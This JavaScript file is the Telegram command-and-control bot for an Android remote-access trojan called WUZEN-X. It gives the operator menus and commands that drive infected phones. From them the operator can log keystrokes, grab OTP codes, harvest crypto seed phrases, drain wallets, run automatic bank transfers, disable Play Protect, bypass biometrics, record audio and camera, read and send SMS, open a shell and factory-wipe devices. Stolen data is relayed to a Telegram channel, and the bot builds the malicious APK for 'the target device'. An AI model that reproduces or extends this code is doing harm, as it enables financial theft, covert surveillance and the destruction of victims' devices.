import { Telegraf } from 'telegraf';
import { config } from './config.js';
import { timestamp, sanitize } from './utils.js';
import { ApkBuilder } from './apk-builder.js';
import EventEmitter from 'events';

export class WuzenBot extends EventEmitter {
  constructor(c2, apkBuilder) {
    super();
    this.c2 = c2;
    this.apkBuilder = apkBuilder || new ApkBuilder();
    this.bot = new Telegraf(config.botToken, { handlerTimeout: 90_000 });
    this.sessionData = new Map();
    this.setup();
  }

  getAdminIds() {
    return config.adminIds.length ? config.adminIds : null;
  }

  isAdmin(ctx) {
    const admins = this.getAdminIds();
    return !admins || admins.includes(ctx.from.id);
  }

  getSession(ctx) {
    const id = ctx.from?.id || ctx.chat?.id;
    if (!this.sessionData.has(id)) {
      this.sessionData.set(id, { selectedDevice: null, pending: null });
    }
    return this.sessionData.get(id);
  }

  statusLine() {
    const online = this.c2?.getOnlineCount?.() || 0;
    const total = this.c2?.getTotalCount?.() || 0;
    const pct = total ? Math.round((online / total) * 100) : 0;
    const filled = Math.round((pct / 100) * 10);
    return `📶 \`${'▰'.repeat(filled)}${'▱'.repeat(10 - filled)}\` — ${online} online / ${total} total (${pct}%)`;
  }

  batteryBar(pct) {
    if (pct == null) return '❓';
    const filled = Math.round(Math.max(0, Math.min(100, pct)) / 10);
    return '▰'.repeat(filled) + '▱'.repeat(10 - filled);
  }

  uptimeText(d) {
    if (!d?.uptime) return '?';
    const h = Math.floor(d.uptime / 3600);
    const m = Math.floor((d.uptime % 3600) / 60);
    return h ? `${h}h ${m}m` : `${m}m`;
  }

  dispatch(id, cmd) {
    const queued = !this.c2.sendCommand(id, cmd);
    return queued
      ? '📥 *queued* (device offline — auto-delivers on reconnect)'
      : '✅ *sent*';
  }

  async sendToChannel(type, data) {
    if (!config.channelId || !this.bot) return;
    try {
      const icons = {
        device_online: '🟢', device_offline: '🔴',
        otp: '🔐', keylog: '⌨️', screenshot: '📸',
        clipboard: '📋', seed: '🌱', crypto: '💰',
        sms: '📨', log: '📝', balance: '💳'
      };
      const icon = icons[type] || '📌';
      let text = `${icon} *WUZEN-X — ${type.toUpperCase()}*\n\n`;
      const model = sanitize(data.info?.model || 'Unknown');
      const short = String(data.id || '?').slice(0, 12);

      if (type === 'device_online') {
        text += `🆕 Device online!\n📱 ${model}\n🆔 \`${short}…\`\n🔋 ${data.info?.battery ?? '?'}%`;
      } else if (type === 'device_offline') {
        text += `💤 Device offline\n📱 ${model}\n🆔 \`${short}…\``;
      } else if (type === 'otp') {
        text += `📱 OTP: \`${sanitize(data.otp)}\`\n🕐 ${data.timestamp}`;
      } else if (type === 'keylog') {
        text += `⌨️ \`${sanitize(data.keys)}\`\n🕐 ${data.timestamp}`;
      } else if (type === 'seed') {
        text += `🌱 SEED HARVESTED\n\`${data.seed}\`\n🕐 ${data.timestamp}`;
      } else if (type === 'clipboard') {
        text += `📋 \`${sanitize(data.content)}\`\n🕐 ${data.timestamp}`;
      } else if (type === 'crypto') {
        text += `💰 \`${data.address}\`\n🕐 ${data.timestamp}`;
      } else if (type === 'sms') {
        text += `📨 ${sanitize(data.content)}\n🕐 ${data.timestamp}`;
      } else if (type === 'balance') {
        text += `💳 ${sanitize(data.data)}\n🕐 ${data.timestamp}`;
      } else {
        text += sanitize(JSON.stringify(data)).slice(0, 1000);
      }
      await this.bot.telegram.sendMessage(config.channelId, text, { parse_mode: 'Markdown' });
    } catch (e) {
      console.error('Channel send error:', e.message);
    }
  }

  mainKeyboard() {
    return {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: '📱 DEVICES', callback_data: 'menu_devices' },
            { text: '🎥 HVNC', callback_data: 'menu_hvnc' },
            { text: '⌨️ KEYLOG', callback_data: 'menu_keylog' }
          ],
          [
            { text: '🔐 OTP GRAB', callback_data: 'menu_otp' },
            { text: '💰 CRYPTO', callback_data: 'menu_crypto' },
            { text: '📸 SCREEN', callback_data: 'menu_screen' }
          ],
          [
            { text: '🏦 BANKING', callback_data: 'menu_banking' },
            { text: '📁 FILES', callback_data: 'menu_files' },
            { text: '📍 LOCATION', callback_data: 'menu_location' }
          ],
          [
            { text: '🎙️ AUDIO', callback_data: 'menu_audio' },
            { text: '📹 CAMERA', callback_data: 'menu_camera' },
            { text: '📨 SMS', callback_data: 'menu_sms' }
          ],
          [
            { text: '🛡️ EVASION', callback_data: 'menu_evasion' },
            { text: '⚙️ SYSTEM', callback_data: 'menu_system' },
            { text: '💣 SABOTAGE', callback_data: 'menu_sabotage' }
          ],
          [
            { text: '📦 BUILD APK', callback_data: 'build_apk' },
            { text: '🌐 DASHBOARD', callback_data: 'menu_dashboard' }
          ],
          [
            { text: '📊 STATS', callback_data: 'menu_stats' },
            { text: '⚙️ SETTINGS', callback_data: 'menu_settings' },
            { text: '🔄 REFRESH', callback_data: 'menu_refresh' }
          ]
        ]
      }
    };
  }

  deviceKeyboard(devices, action, page = 0) {
    const perPage = 6;
    const totalPages = Math.max(1, Math.ceil(devices.length / perPage));
    const pageDevices = devices.slice(page * perPage, (page + 1) * perPage);
    const buttons = [];

    pageDevices.forEach((d) => {
      const label = `${d.online ? '🟢' : '🔴'} ${sanitize(d.info?.model || d.id.slice(0, 10))} [${d.info?.battery ?? '?'}%]`;
      buttons.push([{ text: label, callback_data: `device_select:${d.id}` }]);
    });

    if (totalPages > 1) {
      const nav = [];
      if (page > 0) nav.push({ text: '⬅️', callback_data: `${action}_page:${page - 1}` });
      nav.push({ text: `📄 ${page + 1}/${totalPages}`, callback_data: 'noop' });
      if (page < totalPages - 1) nav.push({ text: '➡️', callback_data: `${action}_page:${page + 1}` });
      buttons.push(nav);
    }

    buttons.push([{ text: '🔙 MAIN MENU', callback_data: 'menu_main' }]);

    return { parse_mode: 'Markdown', reply_markup: { inline_keyboard: buttons } };
  }

  deviceControlKeyboard(id) {
    return {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: '📋 INFO', callback_data: `cmd:${id}:info` }, { text: '🔋 BATTERY', callback_data: `cmd:${id}:battery` }],
          [{ text: '📍 LOCATION', callback_data: `cmd:${id}:location` }, { text: '📸 SCREENSHOT', callback_data: `cmd:${id}:screenshot` }],
          [{ text: '🎥 HVNC START', callback_data: `cmd:${id}:hvnc_start` }, { text: '🎥 HVNC STOP', callback_data: `cmd:${id}:hvnc_stop` }],
          [{ text: '⌨️ KEYLOG ON', callback_data: `cmd:${id}:keylog_on` }, { text: '⌨️ KEYLOG OFF', callback_data: `cmd:${id}:keylog_off` }],
          [{ text: '🔐 OTP ON', callback_data: `cmd:${id}:otp_on` }, { text: '🔐 OTP OFF', callback_data: `cmd:${id}:otp_off` }],
          [{ text: '🔓 UNLOCK', callback_data: `cmd:${id}:unlock` }, { text: '🔒 LOCK', callback_data: `cmd:${id}:lock` }],
          [{ text: '💰 BALANCE', callback_data: `cmd:${id}:balance` }, { text: '💳 WALLETS', callback_data: `cmd:${id}:wallets` }],
          [{ text: '📋 CLIPBOARD', callback_data: `cmd:${id}:clipboard` }, { text: '🌱 SEED', callback_data: `cmd:${id}:seed` }],
          [{ text: '🛡️ PLAY PROTECT OFF', callback_data: `cmd:${id}:pp_off` }, { text: '🛡️ BIOMETRIC BYPASS', callback_data: `cmd:${id}:biometric` }],
          [{ text: '💸 DRAIN', callback_data: `cmd:${id}:drain` }, { text: '🔄 AUTO TRANSFER', callback_data: `cmd:${id}:transfer` }],
          [{ text: '📁 FILES', callback_data: `cmd:${id}:files` }, { text: '📞 CONTACTS', callback_data: `cmd:${id}:contacts` }],
          [{ text: '📡 NETWORK', callback_data: `cmd:${id}:network` }, { text: '🔌 SHELL', callback_data: `cmd:${id}:shell` }],
          [{ text: '🎙️ REC AUDIO', callback_data: `cmd:${id}:record_audio` }, { text: '📹 REC CAMERA', callback_data: `cmd:${id}:record_camera` }],
          [{ text: '📨 SMS SEND', callback_data: `cmd:${id}:sms_send` }, { text: '📨 SMS LIST', callback_data: `cmd:${id}:sms_list` }],
          [{ text: '📱 CALL LOG', callback_data: `cmd:${id}:call_log` }, { text: '📲 APPS', callback_data: `cmd:${id}:apps` }],
          [{ text: '🔇 MUTE', callback_data: `cmd:${id}:mute` }, { text: '🔊 MAX VOL', callback_data: `cmd:${id}:max_volume` }],
          [{ text: '📳 VIBRATE', callback_data: `cmd:${id}:vibrate` }, { text: '🔦 FLASHLIGHT', callback_data: `cmd:${id}:flashlight` }],
          [{ text: '🌐 OPEN URL', callback_data: `cmd:${id}:open_url` }, { text: '📲 NOTIFY', callback_data: `cmd:${id}:send_notification` }],
          [{ text: '⚠️ WIPE', callback_data: `cmd:${id}:wipe` }, { text: '🔄 REBOOT', callback_data: `cmd:${id}:reboot` }],
          [{ text: '🔙 BACK TO DEVICES', callback_data: 'menu_devices' }]
        ]
      }
    };
  }

  confirmKeyboard(action, id) {
    return {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: '⚠️ YES — CONFIRM', callback_data: `confirm:${action}:${id}` }],
          [{ text: '❌ CANCEL', callback_data: `cancel:${id}` }]
        ]
      }
    };
  }

  async runBuild(ctx) {
    const msg = await ctx.reply('📦 *Building APK…*\n_This may take 30–60 seconds_', { parse_mode: 'Markdown' });
    try {
      const result = await this.apkBuilder.build(ctx.from?.id);
      const extra = { parse_mode: 'Markdown', ...this.mainKeyboard() };
      if (result.buffer) {
        await ctx.telegram.deleteMessage(ctx.chat.id, msg.message_id).catch(() => {});
        await ctx.telegram.sendDocument(
          ctx.chat.id,
          { source: result.buffer, filename: result.name },
          {
            caption: `✅ *APK READY — WUZEN-X v20*\n\n📱 \`${result.name}\`\n📏 ${result.size}\n🔑 \`${result.hash.slice(0, 16)}…\`\n\n_Install on the target device_`,
            ...extra
          }
        );
      } else {
        await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, null,
          `✅ *APK Ready*\n\n📱 \`${result.name}\`\n📏 ${result.size}\n🔑 \`${result.hash.slice(0, 16)}…\``, extra);
      }
    } catch (e) {
      await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, null,
        `❌ *Build Failed:* ${e.message}`, { parse_mode: 'Markdown', ...this.mainKeyboard() });
    }
  }

  setup() {
    const bot = this.bot;

    bot.use((ctx, next) => {
      if (!this.isAdmin(ctx)) {
        return ctx.reply('⛔ Unauthorized. You are not an admin.');
      }
      return next();
    });

    // ===== TEXT COMMANDS =====
    bot.start((ctx) => {
      ctx.reply(
        `☠️ *WUZEN-X v20.0 — CYBER RAT SYSTEM*\n\n` +
        `${this.statusLine()}\n` +
        `🕐 ${timestamp()}\n\n` +
        `_Select a module below or /help for all commands_`,
        this.mainKeyboard()
      );
    });

    bot.help((ctx) => {
      ctx.reply(
        `☠️ *WUZEN-X — COMMAND REFERENCE*\n\n` +
        `*📱 Device:*\n` +
        '`/devices` List all devices\n' +
        '`/info <id>` Device info\n' +
        '`/screenshot <id>` Take screenshot\n' +
        '`/location <id>` GPS location\n' +
        '`/unlock <id>` / `/lock <id>` Lock state\n' +
        '`/battery <id>` Battery status\n\n' +
        `*⌨️ Surveillance:*\n` +
        '`/keylog <id> on|off` Keylogger toggle\n' +
        '`/otp <id> on|off` OTP grabber toggle\n' +
        '`/clipboard <id>` Read clipboard\n' +
        '`/record_audio <id> <sec>` Record mic\n' +
        '`/record_camera <id> <sec>` Record camera\n\n' +
        `*💰 Crypto & Banking:*\n` +
        '`/balance <id>` Crypto balances\n' +
        '`/wallets <id>` List wallets\n' +
        '`/seed <id>` Harvest seed phrases\n' +
        '`/drain <id> <addr>` Drain wallet\n' +
        '`/transfer <id> <app> <addr> <amt>` Auto transfer\n\n' +
        `*🛡️ Evasion:*\n` +
        '`/pp_off <id>` Disable Play Protect\n' +
        '`/biometric <id>` Biometric bypass\n\n' +
        `*💣 Sabotage:*\n` +
        '`/wipe <id>` Factory reset\n' +
        '`/reboot <id>` Reboot\n' +
        '`/mute <id>` / `/max_volume <id>` / `/vibrate <id> <ms>`\n\n' +
        `*📦 Build & Control:*\n` +
        '`/build_apk` Build + deliver APK\n' +
        '`/dashboard` Web dashboard\n' +
        '`/hvnc <id>` HVNC session\n' +
        '`/stats` Statistics\n' +
        '`/broadcast <msg>` Message all devices',
        { parse_mode: 'Markdown' }
      );
    });

    bot.command('devices', async (ctx) => {
      const devs = this.c2.getDevices();
      if (!devs.length) return ctx.reply('❌ No devices connected.', this.mainKeyboard());

      let msg = `☠️ *DEVICES — ${devs.length} TOTAL*\n\n`;
      devs.forEach((d) => {
        const status = d.online ? '🟢' : '🔴';
        const up = this.uptimeText(d);
        msg += `${status} \`${d.id.slice(0, 10)}…\` | ${sanitize(d.info?.model || '?')} | ${d.info?.battery ?? '?'}% | ${up}\n`;
      });
      ctx.reply(msg, this.deviceKeyboard(devs, 'device', 0));
    });

    bot.command('stats', async (ctx) => {
      const devs = this.c2.getDevices();
      const online = this.c2.getOnlineCount();
      const models = {};
      devs.forEach((d) => {
        const m = d.info?.model || 'Unknown';
        models[m] = (models[m] || 0) + 1;
      });
      let msg = `☠️ *STATISTICS*\n\n${this.statusLine()}\n\n*📊 Models:*\n`;
      Object.entries(models).sort((a, b) => b[1] - a[1]).forEach(([m, c]) => {
        msg += `  ${sanitize(m)}: ${c}\n`;
      });
      msg += `\n🕐 ${timestamp()}`;
      ctx.reply(msg, { parse_mode: 'Markdown', ...this.mainKeyboard() });
    });

    bot.command('build_apk', (ctx) => this.runBuild(ctx));

    bot.command('dashboard', async (ctx) => {
      const url = `${config.renderUrl}/dashboard`;
      ctx.reply(
        `🌐 *WEB DASHBOARD*\n\n[Open Dashboard](${url})\n\nUser: \`${config.dashboardUser}\`\nPass: \`${config.dashboardPass}\``,
        { parse_mode: 'Markdown', disable_web_page_preview: true, ...this.mainKeyboard() }
      );
    });

    const deviceCommands = [
      'info', 'screenshot', 'location', 'unlock', 'lock', 'battery',
      'clipboard', 'seed', 'balance', 'wallets', 'network',
      'contacts', 'apps', 'call_log', 'sms_list'
    ];
    deviceCommands.forEach((cmd) => {
      bot.command(cmd, async (ctx) => {
        const id = ctx.message.text.split(' ')[1];
        if (!id) return ctx.reply(`Usage: /${cmd} <device_id>`);
        const status = this.dispatch(id, { type: cmd });
        ctx.reply(`⚡ \`/${cmd}\` ${status} to \`${id.slice(0, 10)}…\``, { parse_mode: 'Markdown' });
      });
    });

    bot.command('keylog', async (ctx) => {
      const [, id, state] = ctx.message.text.split(' ');
      if (!id || !['on', 'off'].includes(state)) return ctx.reply('Usage: /keylog <device_id> on|off');
      const status = this.dispatch(id, { type: 'keylog', data: state === 'on' });
      ctx.reply(`⌨️ Keylogger ${state === 'on' ? 'ON' : 'OFF'} — ${status}`, { parse_mode: 'Markdown' });
    });

    bot.command('otp', async (ctx) => {
      const [, id, state] = ctx.message.text.split(' ');
      if (!id || !['on', 'off'].includes(state)) return ctx.reply('Usage: /otp <device_id> on|off');
      const status = this.dispatch(id, { type: 'otp', data: state === 'on' });
      ctx.reply(`🔐 OTP grabber ${state === 'on' ? 'ON' : 'OFF'} — ${status}`, { parse_mode: 'Markdown' });
    });

    bot.command('hvnc', async (ctx) => {
      const id = ctx.message.text.split(' ')[1];
      if (!id) return ctx.reply('Usage: /hvnc <device_id>');
      this.c2.sendCommand(id, { type: 'hvnc_start' });
      const url = `${config.renderUrl}/hvnc/${id}`;
      ctx.reply(
        `🎥 *HVNC SESSION*\n\n[Open HVNC Dashboard](${url})\n\n_Keep this chat open — feed streams to the web dashboard_`,
        { parse_mode: 'Markdown', disable_web_page_preview: true }
      );
    });

    bot.command('drain', async (ctx) => {
      const [, id, addr] = ctx.message.text.split(' ');
      if (!id || !addr) return ctx.reply('Usage: /drain <device_id> <wallet_address>');
      const status = this.dispatch(id, { type: 'drain_wallet', address: addr });
      ctx.reply(`💸 Drain to \`${addr.slice(0, 16)}…\` — ${status}`, { parse_mode: 'Markdown' });
    });

    bot.command('transfer', async (ctx) => {
      const [, id, app, addr, amt] = ctx.message.text.split(' ');
      if (!id || !app || !addr || !amt) return ctx.reply('Usage: /transfer <id> <app_package> <address> <amount>');
      const status = this.dispatch(id, { type: 'auto_transfer', target: app, address: addr, amount: amt });
      ctx.reply(`🔄 ATS ${amt} → \`${addr.slice(0, 12)}…\` via ${app} — ${status}`, { parse_mode: 'Markdown' });
    });

    bot.command('pp_off', async (ctx) => {
      const id = ctx.message.text.split(' ')[1];
      if (!id) return ctx.reply('Usage: /pp_off <device_id>');
      const status = this.dispatch(id, { type: 'disable_play_protect' });
      ctx.reply(`🛡️ Play Protect disable — ${status}`, { parse_mode: 'Markdown' });
    });

    bot.command('biometric', async (ctx) => {
      const id = ctx.message.text.split(' ')[1];
      if (!id) return ctx.reply('Usage: /biometric <device_id>');
      const status = this.dispatch(id, { type: 'biometric_bypass' });
      ctx.reply(`🛡️ Biometric bypass — ${status}`, { parse_mode: 'Markdown' });
    });

    bot.command('wipe', async (ctx) => {
      const id = ctx.message.text.split(' ')[1];
      if (!id) return ctx.reply('Usage: /wipe <device_id>');
      const status = this.dispatch(id, { type: 'wipe' });
      ctx.reply(`💣 Factory reset — ${status}`, { parse_mode: 'Markdown' });
    });

    bot.command('reboot', async (ctx) => {
      const id = ctx.message.text.split(' ')[1];
      if (!id) return ctx.reply('Usage: /reboot <device_id>');
      const status = this.dispatch(id, { type: 'reboot' });
      ctx.reply(`🔄 Reboot — ${status}`, { parse_mode: 'Markdown' });
    });

    bot.command('record_audio', async (ctx) => {
      const [, id, secStr] = ctx.message.text.split(' ');
      const sec = parseInt(secStr) || 10;
      if (!id) return ctx.reply('Usage: /record_audio <device_id> [seconds]');
      const status = this.dispatch(id, { type: 'record_audio', duration: sec });
      ctx.reply(`🎙️ Recording ${sec}s — ${status}`, { parse_mode: 'Markdown' });
    });

    bot.command('record_camera', async (ctx) => {
      const [, id, secStr] = ctx.message.text.split(' ');
      const sec = parseInt(secStr) || 10;
      if (!id) return ctx.reply('Usage: /record_camera <device_id> [seconds]');
      const status = this.dispatch(id, { type: 'record_camera', duration: sec });
      ctx.reply(`📹 Recording ${sec}s — ${status}`, { parse_mode: 'Markdown' });
    });

    bot.command('broadcast', async (ctx) => {
      const msg = ctx.message.text.slice('/broadcast '.length);
      if (!msg) return ctx.reply('Usage: /broadcast <message>');
      const devs = this.c2.getOnlineDevices();
      devs.forEach((d) => this.c2.sendCommand(d.id, { type: 'notification', title: '🔔 WUZEN-X', text: msg }));
      ctx.reply(`📢 Broadcast sent to ${devs.length} devices: "${msg}"`, this.mainKeyboard());
    });

    // ===== CALLBACK QUERY DISPATCHER =====
    bot.on('callback_query', async (ctx) => {
      const data = ctx.callbackQuery.data;
      try {
        if (data === 'noop') return ctx.answerCbQuery().catch(() => {});

        if (data.startsWith('confirm:')) {
          const rest = data.slice(8);
          const sep = rest.lastIndexOf(':');
          const action = rest.slice(0, sep);
          const id = rest.slice(sep + 1);
          const cmdMap = { wipe: { type: 'wipe' }, reboot: { type: 'reboot' } };
          const cmd = cmdMap[action];
          if (cmd) this.c2.sendCommand(id, cmd);
          await ctx.editMessageText(`✅ *${action.toUpperCase()}* executed on \`${id.slice(0, 12)}…\``, this.deviceControlKeyboard(id)).catch(() => {});
          return ctx.answerCbQuery('✅ Confirmed', { show_alert: true }).catch(() => {});
        }
        if (data.startsWith('cancel:')) {
          const id = data.slice(7);
          await ctx.editMessageText('❌ *Cancelled*', this.deviceControlKeyboard(id)).catch(() => {});
          return ctx.answerCbQuery().catch(() => {});
        }

        if (data.startsWith('menu_')) {
          const menu = data.slice(5);

          if (menu === 'main') {
            return ctx.editMessageText(
              `☠️ *WUZEN-X v20.0*\n\n${this.statusLine()}`,
              this.mainKeyboard()
            );
          }
          if (menu === 'refresh') {
            return ctx.editMessageText(
              `🔄 *Refreshed*\n\n${this.statusLine()}`,
              this.mainKeyboard()
            );
          }
          if (menu === 'devices') {
            const devs = this.c2.getDevices();
            if (!devs.length) return ctx.answerCbQuery('❌ No devices', { show_alert: true }).catch(() => {});
            let msg = `☠️ *ALL DEVICES (${devs.length})*\n\n`;
            devs.forEach((d) => {
              msg += `${d.online ? '🟢' : '🔴'} \`${d.id.slice(0, 10)}…\` | ${sanitize(d.info?.model || '?')} | ${d.info?.battery ?? '?'}%\n`;
            });
            return ctx.editMessageText(msg, this.deviceKeyboard(devs, 'device', 0));
          }
          if (menu === 'dashboard') {
            const url = `${config.renderUrl}/dashboard`;
            return ctx.editMessageText(
              `🌐 *WEB DASHBOARD*\n\n[Open Dashboard](${url})\n\nUser: \`${config.dashboardUser}\`\nPass: \`${config.dashboardPass}\``,
              { parse_mode: 'Markdown', disable_web_page_preview: true, ...this.mainKeyboard() }
            );
          }
          if (menu === 'stats') {
            const devs = this.c2.getDevices();
            return ctx.editMessageText(
              `☠️ *STATISTICS*\n\n${this.statusLine()}\n\n🆔 Unique models: ${new Set(devs.map((d) => d.info?.model)).size}`,
              { parse_mode: 'Markdown', ...this.mainKeyboard() }
            );
          }
          if (menu === 'settings') {
            return ctx.editMessageText(
              `*⚙️ SETTINGS*\n\n` +
              `🤖 Bot: @${ctx.botInfo?.username || 'active'}\n` +
              `📢 Channel: ${config.channelId || 'Not set'}\n` +
              `🌐 Dashboard: ${config.renderUrl}/dashboard\n` +
              `🕐 Server: ${timestamp()}`,
              { parse_mode: 'Markdown', ...this.mainKeyboard() }
            );
          }

          const devs = this.c2.getOnlineDevices();
          if (!devs.length) return ctx.answerCbQuery('❌ No online devices', { show_alert: true }).catch(() => {});
          const categoryIcons = {
            hvnc: '🎥', keylog: '⌨️', otp: '🔐', crypto: '💰',
            screen: '📸', banking: '🏦', files: '📁', location: '📍',
            audio: '🎙️', camera: '📹', sms: '📨', evasion: '🛡️',
            system: '⚙️', sabotage: '💣'
          };
          const icon = categoryIcons[menu] || '📌';
          return ctx.editMessageText(
            `${icon} *${menu.toUpperCase()} — SELECT DEVICE:*`,
            this.deviceKeyboard(devs, menu, 0)
          );
        }

        const pageMatch = data.match(/^(\w+)_page:(\d+)$/);
        if (pageMatch) {
          const prefix = pageMatch[1];
          const page = parseInt(pageMatch[2]);
          const devs = prefix === 'device' ? this.c2.getDevices() : this.c2.getOnlineDevices();
          if (!devs.length) return ctx.answerCbQuery('❌ No devices', { show_alert: true }).catch(() => {});
          return ctx.editMessageText('*📱 SELECT DEVICE:*', this.deviceKeyboard(devs, prefix, page));
        }

        if (data.startsWith('device_select:')) {
          const id = data.slice('device_select:'.length);
          const d = this.c2.getDevice(id);
          if (!d) return ctx.answerCbQuery('❌ Device not found', { show_alert: true }).catch(() => {});
          const model = sanitize(d.info?.model || 'Unknown');
          const brand = sanitize(d.info?.brand || '?');
          const battery = d.info?.battery ?? '?';
          return ctx.editMessageText(
            `☠️ *DEVICE CONTROL PANEL*\n\n` +
            `🆔 \`${d.id}\`\n` +
            `📱 ${model} (${brand})\n` +
            `🤖 Android ${d.info?.android || '?'} · API ${d.info?.sdk || '?'}\n` +
            `🔋 Battery: ${battery}% ${this.batteryBar(battery)}\n` +
            `📡 ${d.online ? '🟢 ONLINE' : '🔴 OFFLINE'} · Buffer: ${d.bufferSize || 0}\n` +
            `⏱ Uptime: ${this.uptimeText(d)}\n` +
            `🕐 First seen: ${new Date(d.firstSeen).toLocaleString()}\n\n` +
            `_Destructive actions require confirmation_`,
            this.deviceControlKeyboard(id)
          );
        }

        if (data.startsWith('cmd:')) {
          const rest = data.slice(4);
          const sep = rest.lastIndexOf(':');
          if (sep <= 0) return ctx.answerCbQuery().catch(() => {});
          const id = rest.slice(0, sep);
          const action = rest.slice(sep + 1);

          const commandMap = {
            info: { type: 'info' }, battery: { type: 'battery' },
            location: { type: 'location' }, screenshot: { type: 'screenshot' },
            hvnc_start: { type: 'hvnc_start' }, hvnc_stop: { type: 'hvnc_stop' },
            keylog_on: { type: 'keylog', data: true }, keylog_off: { type: 'keylog', data: false },
            otp_on: { type: 'otp', data: true }, otp_off: { type: 'otp', data: false },
            unlock: { type: 'unlock' }, lock: { type: 'lock' },
            balance: { type: 'balance' }, wallets: { type: 'wallets' },
            clipboard: { type: 'clipboard' }, seed: { type: 'seed' },
            pp_off: { type: 'disable_play_protect' }, biometric: { type: 'biometric_bypass' },
            files: { type: 'files' }, contacts: { type: 'contacts' },
            network: { type: 'network' }, shell: { type: 'shell' },
            record_audio: { type: 'record_audio', duration: 10 },
            record_camera: { type: 'record_camera', duration: 10 },
            sms_list: { type: 'sms_list' }, call_log: { type: 'call_log' },
            apps: { type: 'apps' }, mute: { type: 'mute' },
            max_volume: { type: 'max_volume' }, vibrate: { type: 'vibrate', duration: 3000 },
            flashlight: { type: 'flashlight' },
            drain: { type: 'drain_wallet', needsInput: true, prompt: '💰 *DRAIN* — send the wallet address to drain to' },
            transfer: { type: 'auto_transfer', needsInput: true, prompt: '🔄 *AUTO TRANSFER* — send in format:\n`app_package|address|amount`' },
            open_url: { type: 'open_url', needsInput: true, prompt: '🌐 *OPEN URL* — send the URL' },
            sms_send: { type: 'sms_send', needsInput: true, prompt: '📨 *SMS SEND* — send in format:\n`number|message`' },
            send_notification: { type: 'notification', needsInput: true, prompt: '📲 *NOTIFICATION* — send the text' },
            wipe: { type: 'wipe', needsConfirm: true },
            reboot: { type: 'reboot', needsConfirm: true }
          };

          const cmd = commandMap[action];
          if (!cmd) return ctx.answerCbQuery().catch(() => {});

          if (cmd.needsConfirm) {
            return ctx.editMessageText(
              `⚠️ *CONFIRM ${action.toUpperCase()}* on \`${id.slice(0, 12)}…\`?\n_This cannot be undone_`,
              this.confirmKeyboard(action, id)
            );
          }
          if (cmd.needsInput) {
            const session = this.getSession(ctx);
            session.pending = { deviceId: id, action: cmd.type };
            await ctx.answerCbQuery().catch(() => {});
            return ctx.reply(cmd.prompt, { parse_mode: 'Markdown', ...this.deviceControlKeyboard(id) });
          }
          if (action === 'hvnc_start') {
            this.c2.sendCommand(id, cmd);
            const url = `${config.renderUrl}/hvnc/${id}`;
            return ctx.reply(
              `🎥 *HVNC SESSION STARTED*\n\n[Open HVNC Dashboard](${url})`,
              { parse_mode: 'Markdown', disable_web_page_preview: true, ...this.deviceControlKeyboard(id) }
            );
          }
          this.c2.sendCommand(id, cmd);
          return ctx.answerCbQuery(`✅ ${action} sent`, { show_alert: false }).catch(() => {});
        }

        if (data === 'build_apk') {
          await ctx.answerCbQuery().catch(() => {});
          return this.runBuild(ctx);
        }

        return ctx.answerCbQuery().catch(() => {});
      } catch (e) {
        console.error('Callback error:', e.message);
        try { await ctx.answerCbQuery('❌ Error: ' + e.message, { show_alert: true }); } catch {}
      }
    });

    // ===== PENDING INPUT =====
    bot.on('text', (ctx) => {
      const session = this.getSession(ctx);
      if (!session.pending) return;
      const text = ctx.message.text.trim();
      if (text.startsWith('/')) return;
      const { deviceId, action } = session.pending;
      session.pending = null;

      const builders = {
        drain_wallet: (v) => ({ type: 'drain_wallet', address: v }),
        auto_transfer: (v) => {
          const [app, address, amount] = v.split('|').map((s) => s.trim());
          if (!app || !address || !amount) throw new Error('Format: app_package|address|amount');
          return { type: 'auto_transfer', target: app, address, amount };
        },
        open_url: (v) => ({ type: 'open_url', url: v }),
        sms_send: (v) => {
          const [number, ...rest] = v.split('|');
          if (!number || !rest.length) throw new Error('Format: number|message');
          return { type: 'sms_send', number: number.trim(), message: rest.join('|').trim() };
        },
        notification: (v) => ({ type: 'notification', title: '🔔 WUZEN-X', text: v })
      };

      try {
        const cmd = builders[action] ? builders[action](text) : { type: action, data: text };
        const queued = !this.c2.sendCommand(deviceId, cmd);
        ctx.reply(
          `✅ \`${action}\` ${queued ? '📥 queued (offline — delivers on reconnect)' : 'sent'} to \`${deviceId.slice(0, 12)}…\``,
          { parse_mode: 'Markdown', ...this.deviceControlKeyboard(deviceId) }
        );
      } catch (e) {
        ctx.reply(`❌ ${e.message}\n_Send again or cancel_`, { parse_mode: 'Markdown' });
      }
    });

    bot.catch((err, ctx) => {
      console.error('Bot error:', err?.message || err);
    });
  }

  async launch() {
    await this.bot.telegram.setMyCommands([
      { command: 'start', description: '🔄 Main menu' },
      { command: 'devices', description: '📱 List all devices' },
      { command: 'stats', description: '📊 Statistics' },
      { command: 'build_apk', description: '📦 Build APK' },
      { command: 'dashboard', description: '🌐 Web dashboard' },
      { command: 'help', description: '📚 All commands' }
    ]).catch(() => {});
    this.bot.launch();
    return this.bot;
  }

  stop() {
    this.bot.stop();
  }
}

export function setupBot(c2, apkBuilder) {
  const wuzen = new WuzenBot(c2 || {}, apkBuilder);
  wuzen.launch();
  return wuzen;
}
